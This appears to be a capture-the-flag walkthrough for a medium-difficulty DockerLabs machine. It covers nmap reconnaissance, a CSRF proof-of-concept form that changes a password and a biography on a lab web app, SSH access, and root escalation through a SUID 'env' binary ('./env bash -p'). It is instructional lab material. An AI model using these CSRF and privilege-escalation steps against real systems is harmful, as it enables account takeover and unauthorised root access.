![Screenshot](/medium/Crossfi/Images/machine.png)

Difficulty: **medium**

Made by: **el pinguino de mario**

---
# Steps to pwn 🥽

* 👁️  [Reconnaissance](#reconnaissance)
* 🪓 [Exploitation](#exploitation)
* 🚩 [Privilege Escalation](#privilege-escalation)

---

First of all we make sure the machine is up, we can do this with the command **ping**.

```java
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/crossfi]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.267 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.147 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.094 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2050ms
rtt min/avg/max/mdev = 0.094/0.169/0.267/0.072 ms
```

After seeing this, we can start now our **reconnaissance** phase.

---
# Reconnaissance

We always start with **nmap** to know what ports are open in the target.

```java
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/crossfi]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-27 19:34 -05
Initiating ARP Ping Scan at 19:34
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 19:34, 0.18s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 19:34
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 5000/tcp on 172.17.0.2
Completed SYN Stealth Scan at 19:34, 3.50s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000027s latency).
Scanned at 2025-11-27 19:34:55 -05 for 3s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
5000/tcp open  upnp    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 4.01 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- With this argument we tell to nmap to scan all the ports, starting from the port 1, to the port 65,535 port.

**-n** <- With this argument nmap are going to skip the DNS resolution, this is because sometimes in our scans this can be in some cases very slow.

**-sS** <- With this argument nmap will going to make a stealth-scan, this means that the 3-way-handshake will not be accomplished, and also make the scan slightly faster.

**--min-rate 5000** <- With this argument nmap, will send at least 5000 packages per second, making the scan even more faster.

**-Pn** <- With this argument nmap will also skip the Host discovery phase, this means that nmap will treat the machine as active and do immediately the scan.

**-vv** <- With this argument nmap will show us the discovered open ports while the scan continues, this means if nmap discover a open port immediately will report to us as the scan continues.

**--open** <- With this argument we are telling to nmap to only filter the open ports.

After the scan concludes we can see 2 ports open:

- port 22 (ssh / secure shell)
- port 5000 ***(upnp?)***

We can make another **nmap** scan to know more about this 2 ports.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/crossfi]
└─$ nmap -p22,5000 -sCV 172.17.0.2 -oX target --stats-every=1m
```

**-p22,5000** <- With this argument nmap will only scan this 2 ports that we discover.

**-sCV** <- With this argument nmap will going to scan per each port his version to find some possible vulnerabilities about not updated systems, and also make a scan with some scripts that executes nmap, to find more about this ports.

**-oX target** <- With this argument we save all the output that nmap give us and save it as a xml file.

**--stats-every=1m** <- With this argument we receive stats of the scan every 1 minute, this can have minutes (m) and seconds (s)

After the scan finish we got the output in a xml file, we do this to make a html page to see the information more easily and pretty to look at.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/crossfi]
└─$ xsltproc target -o target.html
```

With this command we convert the xml file to a html file, now let's open it.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/crossfi]
└─$ open target.html 
```

And we can see this in our browser.

![Screenshot](/medium/Crossfi/Images/image1.png)

It's way more clean and pretty, but we can see that the port 5000 it's a website, let's take a look with our browser.

![Screenshot](/medium/Crossfi/Images/image2.png)

We see here a login page, let's register an account.

![Screenshot](/medium/Crossfi/Images/image3.png)

After we create a account we can see this and also we see a panel on the website, let's take a look on it.

![Screenshot](/medium/Crossfi/Images/image4.png)

It shows a hint that this website is vulnerable to CSRF (cross-site request forgery) and also we can change our password, let's intercept the request with **burpsuite**.

And we receive this:

```python
POST /change-password HTTP/1.1
Host: 172.17.0.2:5000
Content-Length: 20
Cache-Control: max-age=0
Authorization: Basic cGluZ3Vpbml0bzpwaW5ndWluaXRvamVqZQ==
Origin: http://172.17.0.2:5000
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-GB,en;q=0.5
Referer: http://172.17.0.2:5000/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: iconSize=16x16; session=eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImNyYWZ0In0.aSj-nA.6EOITNgqiuCcMwWmtNQO1GKweTQ
Connection: keep-alive

new_password=test123
```

We can see this that this is vulnerable to CSRF, because the website doesn't have a CSRF token to prevent this type of attack. Now im going to make a page to exploit this vulnerability and change the password that I want.

![Screenshot](/medium/Crossfi/Images/image5.png)

**Note:** when the client and a server establishes a connection, every time that the user makes a request to the server, the server creates another random token.

---
# Exploitation

![Screenshot](/medium/Crossfi/Images/image6.png)

Now we open our html file.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/crossfi]
└─$ open exploit.html
```

We can see this:

![Screenshot](/medium/Crossfi/Images/image7.png)

We got this credentials of login to the next level.

**Note**: This kind of exploit of CSRF works when a user click this html file or like a some kind of website, to exploit this we need to do some social engineering, this is dangerous if there is a admin or privileged account of the website, if the victim open this we can make a lot of damage, like change passwords like in this case, emails, nicknames, publish something like the attack of twitter or even more.

Now let's pass to our 2nd challenge.

![Screenshot](/medium/Crossfi/Images/image8.png)

It seems that this part is also vulnerable to attacks of CSRF, but it exists just a camp with this vulnerability, to find out we can take a look to the source code of the website.

```html
<!-- Biografía -->
<div class="col-md-12 mb-3">
<div class="field-card">
<label class="field-label">
🔒 Biografía
<span class="badge bg-success ms-2" style="font-size: 0.7rem;">Protegido</span>
</label>
<form method="POST" action="/update-biografia" class="field-form">
<textarea class="form-control profile-input mb-2" name="biografia" rows="4"
placeholder="Háblanos un poco sobre ti..."
required></textarea>
<button type="submit" class="btn btn-outline-success w-100">Actualizar
Biografía</button>
</form>
</div>
</div>
</div>
```

The part of biography it's vulnerable to attacks of CSRF, because it not saves the csrf token here. To see the difference we can take a look of the camp **name** to look on it.

```html
<input type="hidden" name="csrf_token" value="[REDACTED]">
```

This token prevent attacks of CSRF, because the backend always check the token of any request.

The technique it's the same to change the description, make a html file to exploit this vulnerability. But first, let's intercept the request to see what it looks like.

```python
POST /update-biografia HTTP/1.1
Host: 172.17.0.2:5000
Content-Length: 17
Cache-Control: max-age=0
Authorization: Basic cGluZ3Vpbml0bzpwaW5ndWluaXRvamVqZQ==
Origin: http://172.17.0.2:5000
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-GB,en;q=0.5
Referer: http://172.17.0.2:5000/csrf-level2
Accept-Encoding: gzip, deflate, br
Cookie: iconSize=16x16; session=.eJwlzD0KwzAMBtC7aO7gz7KDyGWCrB8opSk46VR69xayvel9yI6Z2_l6xE4raU33CnerGl1gwl07wsFlLKLcDE2QS5EYzlmycEjTXhMDSLrR-4i53Z1WXN71Gf_ZpuZJ3x-BcyH9.aSkNig.8AbVXDPP1KpM96vmfQlSEUhm-m8
Connection: keep-alive

biografia=test123
```

We can clearly see that it not sends the csrf token, this means that we can exploit this.

```html
<form action="http://172.17.0.2:5000/update-biografia" method="POST" id="hacked">
        <input type="hidden" name="biografia" value="pwned">
</form>
```

We change the biography to **"pwned"** now let's see if it works.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/crossfi]
└─$ open exploit.html
```

And we can see this:

![Screenshot](/medium/Crossfi/Images/image9.png)

We successfully exploited this vulnerability and we got the credentials to login with **ssh**.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/crossfi]
└─$ ssh balulero@172.17.0.2
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is: SHA256:Y+vEVikvjmIThe5dO9et3Qg4KGerzvldsBAkamu/g6Y
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
balulero@172.17.0.2's password: 
Linux 8d0ccb7863ee 6.16.8+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.16.8-1kali1 (2025-09-24) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
balulero@8d0ccb7863ee:~$
```

Now we are in as the user **balulero**!

---
# Privilege Escalation

Let's see if exists any SUID in the target to escalate our privileges.

```
balulero@8d0ccb7863ee:~$ find / -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/env
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/su
/usr/bin/chsh
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/sudo
```

We can see that the command **env** have this permission. This is a potential way to escalate our privileges.

First, we change to the **/usr/bin/** directory.

```
balulero@8d0ccb7863ee:~$ cd /usr/bin
```

The command **env** can execute another program or command in a environment modified without affecting the actual environment that we are currently working on.

```
balulero@8d0ccb7863ee:/usr/bin$ ./env whoami
root
```

As we can see here we can execute any command of the system as the user **root**.

To gain a shell of the user **root** we can execute the next command:

```
balulero@8d0ccb7863ee:/usr/bin$ ./env bash -p
```

This command does that we launch a shell with bash as privileged (-p), this means that we are going to get a shell as the proprietary of **bash** (**root**)

```
balulero@8d0ccb7863ee:/usr/bin$ ./env bash -p
bash-5.2# whoami
root
```

Now we are root ***...pwned..!***

